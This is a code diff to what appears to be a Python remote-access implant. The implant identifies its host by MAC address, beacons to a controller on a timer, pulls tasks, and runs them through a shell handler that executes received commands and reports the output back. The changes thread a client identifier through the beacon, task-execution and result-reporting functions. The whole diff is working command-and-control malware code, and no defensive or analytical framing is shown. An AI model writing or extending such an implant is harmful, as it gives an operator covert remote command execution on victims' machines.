@@ -54,8 +54,10 @@ def identify():
         "mac": get_mac(),
     })
 
-def beacon():
-    return rpc("beacon")
+def beacon(client_id):
+    return rpc("beacon", {
+        "client_id": client_id
+    })
 
 def shell_handler(params):
     cmd = params.get("cmd")
@@ -79,7 +81,7 @@ def shell_handler(params):
         "exit_code": result.returncode
     }
 
-def execute_task(task):
+def execute_task(client_id, task):
     if not task:
         return
     
@@ -99,7 +101,7 @@ def execute_task(task):
     handler = handlers.get(method)
 
     if not handler:
-        send_result(task_id, {
+        send_result(client_id, task_id, {
             "status": "error",
             "output": {
                 "stderr": "method not found",
@@ -112,13 +114,13 @@ def execute_task(task):
     try:
         result = handler(params)
 
-        send_result(task_id, {
+        send_result(client_id, task_id, {
             "status": "ok",
             "output": result
         })
     
     except Exception as e:
-        send_result(task_id, {
+        send_result(client_id, task_id, {
             "status": "error",
             "output": {
                 "stderr": str(e),
@@ -127,8 +129,9 @@ def execute_task(task):
             }
         })
 
-def send_result(task_id, result):
+def send_result(client_id, task_id, result):
     rpc("task_result", {
+        "client_id": client_id,
         "task_id": task_id,
         "result": result
     })
@@ -142,17 +145,23 @@ def main():
         print("[-] failed to load profile")
         return
     
-    print("[+] identified")
+    client_id = result.get("client_id")
+
+    if not client_id:
+        print("[DEBUG] no client_id received")
+        return
+
+    print(f"[+] identified as {client_id}")
     
     while True:
         try:
             time.sleep(BEACON_INTERVAL)
 
-            result = beacon()
+            result = beacon(client_id)
             if not result:
                 continue
 
-            execute_task(result.get("task"))
+            execute_task(client_id, result.get("task"))
 
         except Exception as e:
             print("[LOOP ERROR]", e)
